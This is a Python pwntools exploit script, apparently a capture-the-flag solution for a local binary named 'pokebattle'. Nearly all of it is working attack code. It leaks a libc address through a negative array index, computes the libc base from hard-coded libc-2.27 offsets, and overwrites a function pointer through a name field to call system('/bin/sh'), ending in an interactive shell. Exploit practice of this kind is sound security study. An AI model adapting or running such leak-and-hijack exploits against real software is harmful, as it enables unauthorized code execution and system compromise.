### use your libc addresses when you execute this code
from pwn import *

context.log_level = 'DEBUG'
is_remote = False

def attack():
	p.recvuntil(b'> ')
	p.sendline(b'1')

def pokeball(slot, name):
	p.recvuntil(b'> ')
	p.sendline(b'2')
	p.recvuntil(b'slot : \n')
	p.sendline(slot)
	p.recvuntil(b'name : \n')
	p.sendline(name)

def run():
	p.recvuntil(b'> ')
	p.sendline(b'3')

if is_remote:
	log.info('This code is not for remote exploit, sorry.')
	exit(0)
	
else:
	p = process("./pokebattle")

	### --- These are libc offset addresses of my environment, /lib/x86_64-linux-gnu/libc-2.27.so ---
	libc_start_main_offset = 0x21ab0
	system_offset = 0x4f440

### _libc_start_main address leak:  
p.recvuntil(b'> ')
p.sendline(b'4')
p.recvuntil(b'Select Pokemon : \n')
p.sendline(b'-2')

libc_start_main = int.from_bytes(p.recvuntil(b'\x7f')[-6:], 'little')
libc_base = libc_start_main - libc_start_main_offset
log.info('libc_base: %x' % libc_base)

### force 'call rcx' to call system('/bin/sh'): rcx will be address of system(), rdi will be address of '/bin/sh\x00'
# I like this magic-like exploit!! 
pokeball(b'0', b'/bin/sh\x00' + b'A' * (0x28 - 8) + p64(libc_base + system_offset))

p.recvuntil(b'> ')
p.sendline(b'4')
p.recvuntil(b'Select Pokemon : \n')
p.sendline(b'0')

attack()

p.interactive()